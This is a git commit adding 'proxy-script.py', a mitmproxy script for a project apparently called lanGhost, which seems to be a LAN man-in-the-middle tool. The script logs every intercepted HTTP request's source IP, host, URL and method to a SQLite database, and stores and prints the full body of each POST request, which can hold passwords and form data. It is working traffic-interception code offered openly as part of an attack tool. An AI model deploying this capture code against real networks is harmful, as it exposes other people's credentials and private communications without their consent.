60a54d0ed75067a6af0ceb27cf69730a78f85ed9
xdavidhu <xdavid@protonmail.com>
2017-12-07 19:49:59 +0100

    ✨ Added mitmproxy custom script

---
+++ proxy-script.py
@@ -0,0 +1,23 @@
+from mitmproxy import http
+import sqlite3, time
+
+DBconn = sqlite3.connect("lanGhost.db")
+DBcursor = DBconn.cursor()
+DBcursor.execute("CREATE TABLE IF NOT EXISTS lanGhost_mitm (id integer primary key autoincrement, source VARCHAR(50),host TEXT, url TEXT, method VARCHAR(50), data TEXT, time TEXT)")
+DBconn.commit()
+DBconn.close()
+
+# source, host, url, method, data, time
+
+def request(flow):
+    DBconn = sqlite3.connect("lanGhost.db")
+    DBcursor = DBconn.cursor()
+    if flow.request.method == "POST":
+        DBcursor.execute("INSERT INTO lanGhost_mitm(source, host, url, method, data, time) VALUES (?, ?, ?, ?, ?, ?)", (str(flow.client_conn.address()[0]), str(flow.request.host), str(flow.request.url), str(flow.request.method), str(flow.request.text), str(int(time.time()))))
+        DBconn.commit()
+        print(str(flow.client_conn.address()[0]) + " - " + flow.request.host + " - " + flow.request.url + " - " + flow.request.method + " - " + str(flow.request.text) + " - " + str(int(time.time())))
+    else:
+        DBcursor.execute("INSERT INTO lanGhost_mitm(source, host, url, method, data, time) VALUES (?, ?, ?, ?, ?, ?)", (str(flow.client_conn.address()[0]), str(flow.request.host), str(flow.request.url), str(flow.request.method), "false", str(int(time.time()))))
+        DBconn.commit()
+        print(str(flow.client_conn.address()[0]) + " - " + flow.request.host + " - " + flow.request.url + " - " + flow.request.method + " - " + "false" + " - " + str(int(time.time())))
+    DBconn.close()
